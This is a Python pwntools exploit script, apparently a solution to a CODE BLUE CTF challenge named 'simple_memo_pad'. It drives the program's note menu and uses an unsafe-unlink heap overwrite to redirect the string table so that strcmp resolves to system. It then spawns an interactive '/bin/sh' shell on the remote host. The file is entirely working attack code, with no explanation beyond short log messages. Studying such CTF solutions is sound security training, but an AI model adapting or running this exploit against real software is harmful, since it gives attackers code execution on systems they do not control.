#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "memopad.tasks.ctf.codeblue.jp"
PORT = 5498

def write_note(content):
    r.sendline("1")
    r.sendlineafter("Content: ", content)    
    r.recvuntil("> ")

def edit_note(idx, content, usenl=True):
    r.sendline("2")
    r.sendlineafter("Index: ", str(idx))
    r.sendlineafter("Content: ", content)
    r.recvuntil("> ")

def del_note(idx, usenl=True):
    r.sendline("3")
    r.sendlineafter("Index: ", str(idx))
    r.recvuntil("> ")

def quit(answer):
    r.sendline("5")

    r.sendlineafter("(y/n)", answer)

def exploit(r):
    e = ELF("./simple_memo_pad")
    
    r.recvuntil("> ")

    log.info("Create fake entry for str tab")

    payload = "A" * 83
    payload += "system"

    write_note(payload)

    log.info("Create another note for unsafe unlink")
    write_note("A" * 128)

    log.info("Overwrite FD pointer of the 3rd chunk with pointer to STRTAB")
    payload = "A" * 128
    payload += p64(0x601858 - 0x98)

    log.info("Unlink to overwrite STRTAB address with chunk 2 address")
    edit_note(3, payload)
    del_note(3)

    log.info("Exit with '/bin/sh' to resolve strcmp as system")
    quit("/bin/sh")

    r.interactive()

    return

if __name__ == "__main__":
    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = process("./simple_memo_pad")
        print util.proc.pidof(r)
        pause()
        exploit(r)
